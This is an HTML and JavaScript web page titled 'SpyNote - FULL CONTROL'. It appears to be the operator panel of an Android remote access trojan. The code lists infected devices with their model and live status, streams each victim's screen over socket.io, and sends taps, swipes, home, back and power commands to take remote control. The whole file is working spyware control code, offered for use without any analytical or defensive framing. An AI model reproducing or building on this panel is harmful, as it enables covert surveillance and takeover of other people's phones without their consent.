<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote - FULL CONTROL</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        /* Same CSS as before - no changes needed */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: white; height: 100vh; overflow: hidden; user-select: none;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; z-index: 1000;
            background: rgba(0,0,0,0.95); padding: 15px; 
            max-height: 85vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #333;
        }
        .device { padding: 15px; margin: 8px 0; background: #1e1e2e; cursor: pointer; 
            border-radius: 12px; transition: all 0.3s; border: 1px solid #333; }
        .device:hover { background: #2a2a3e; transform: translateX(5px); box-shadow: 0 5px 15px rgba(0,255,136,0.3); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; box-shadow: 0 0 20px #00ff88; }
        .disconnected { opacity: 0.5; }

        #phone-frame {
            position: fixed; right: 10px; top: 50%; transform: translateY(-50%);
            width: min(90vw, 420px); height: min(90vh, 880px); 
            background: #111; border: 30px solid #222; border-radius: 60px; 
            box-shadow: 0 30px 60px rgba(0,0,0,0.8); cursor: pointer; touch-action: none;
        }
        #screen { width: 100%; height: 100%; background: #000; border-radius: 30px; }
        #fps-counter, #status { position: fixed; top: 10px; right: 10px; font-size: 12px; color: #00ff88; z-index: 1001; }
        #status { top: 35px; }
        
        #top-controls, #bottom-controls {
            position: fixed; z-index: 1001; background: rgba(0,0,0,0.9); 
            padding: 10px; border-radius: 10px; backdrop-filter: blur(20px);
        }
        #top-controls { top: 10px; right: 320px; }
        #bottom-controls { bottom: 20px; left: 50%; transform: translateX(-50%); }
        
        button {
            padding: 12px 24px; margin: 5px; background: linear-gradient(45deg, #667eea, #764ba2); 
            color: white; border: none; border-radius: 25px; cursor: pointer; 
            font-size: 14px; font-weight: 600; transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(102,126,234,0.4);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(102,126,234,0.6); }
        button:active { transform: translateY(0); }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± Devices (<span id="deviceCount">0</span>)</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="fps-counter">FPS: 0</div>
    <div id="status">Device: - | Status: Ready</div>
    
    <div id="top-controls">
        <button onclick="sendControl('home')">üè† Home</button>
        <button onclick="sendControl('recent')">üìã Recent</button>
    </div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="bottom-controls">
        <button onclick="sendControl('back')">üîô Back</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
        <button onclick="sendControl('power')">üîí Power</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0;
        let dragging = false, startX = 0, startY = 0;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const deviceCount = document.getElementById('deviceCount');
        const fpsCounter = document.getElementById('fps-counter');
        const statusDiv = document.getElementById('status');

        socket.on('connect', () => {
            statusDiv.innerHTML = 'Device: - | Status: ‚úÖ Connected';
        });

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            const img = new Image();
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                ctx.imageSmoothingEnabled = false;
                ctx.drawImage(img, 0, 0, rect.width, rect.height);
                
                frameCount++;
                const now = performance.now();
                if (now - lastFrameTime >= 1000) {
                    fpsCounter.textContent = `FPS: ${Math.round(frameCount * 1000 / (now - lastFrameTime))}`;
                    frameCount = 0;
                    lastFrameTime = now;
                }
            };
            img.src = 'data:image/jpeg;base64,' + data.data;
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        function updateDeviceList(devices) {
            deviceCount.textContent = devices.length;
            deviceList.innerHTML = devices.map(([id, info]) => `
                <div class="device ${!info.connected ? 'disconnected' : ''}" 
                     onclick="selectDevice('${id}', this)">
                    <b>${info.model?.slice(0,20) || id.slice(0,8)}</b><br>
                    <small>${info.brand || 'Android'} ${info.version || ''}</small><br>
                    <span style="font-size:10px">${info.connected ? 'üü¢ LIVE' : 'üî¥ OFF'}</span>
                </div>
            `).join('') || '<div style="opacity:0.5">No devices</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            statusDiv.innerHTML = `Device: ${deviceId.slice(0,8)} | Status: üéÆ ACTIVE`;
            console.log('‚úÖ ACTIVE:', deviceId);
        }

        // üî• COORDINATE SCALING
        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            return {
                x: Math.floor((clientX - rect.left) * (deviceWidth / rect.width)),
                y: Math.floor((clientY - rect.top) * (deviceHeight / rect.height))
            };
        }

        // üî• TOUCH & MOUSE - 100% FIXED
        function handlePointerStart(e) {
            e.preventDefault();
            dragging = true;
            
            const clientX = e.touches?.[0]?.clientX || e.clientX;
            const clientY = e.touches?.[0]?.clientY || e.clientY;
            const coords = getScaledCoords(clientX, clientY);
            startX = coords.x;
            startY = coords.y;
            
            sendControl('tap', coords.x, coords.y);
        }

        function handlePointerMove(e) {
            if (!dragging || !currentDevice) return;
            e.preventDefault();
            
            const clientX = e.touches?.[0]?.clientX || e.clientX;
            const clientY = e.touches?.[0]?.clientY || e.clientY;
            const coords = getScaledCoords(clientX, clientY);
            
            const dx = Math.abs(coords.x - startX);
            const dy = Math.abs(coords.y - startY);
            
            if (dy > dx && dy > 20) {
                sendControl('scroll', startX, startY, coords.x, coords.y);
            } else {
                sendControl('swipe', startX, startY, coords.x, coords.y);
            }
        }

        function handlePointerEnd(e) {
            e.preventDefault();
            dragging = false;
        }

        // Add all events
        ['mousedown', 'touchstart'].forEach(ev => phoneFrame.addEventListener(ev, handlePointerStart, { passive: false }));
        ['mousemove', 'touchmove'].forEach(ev => phoneFrame.addEventListener(ev, handlePointerMove, { passive: false }));
        ['mouseup', 'touchend', 'touchcancel'].forEach(ev => phoneFrame.addEventListener(ev, handlePointerEnd, { passive: false }));

        // üî• UNIVERSAL CONTROL SENDER
        function sendControl(action, x, y, endX, endY) {
            if (!currentDevice) {
                statusDiv.innerHTML = 'Device: - | Status: ‚ùå SELECT DEVICE FIRST';
                return;
            }
            
            const data = { deviceId: currentDevice, action };
            if (x !== undefined) {
                data.x = x; data.y = y;
                data.startX = x; data.startY = y;
            }
            if (endX !== undefined) {
                data.endX = endX; data.endY = endY;
            }
            
            console.log('üì§', data);
            socket.emit('control', data);
            statusDiv.innerHTML = `Device: ${currentDevice.slice(0,8)} | ${action.toUpperCase()} SENT`;
        }

        function toggleFullScreen() {
            document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();
        }

        setTimeout(() => fetch('/devices').then(r=>r.json()).then(updateDeviceList), 1000);
    </script>
</body>
</html>
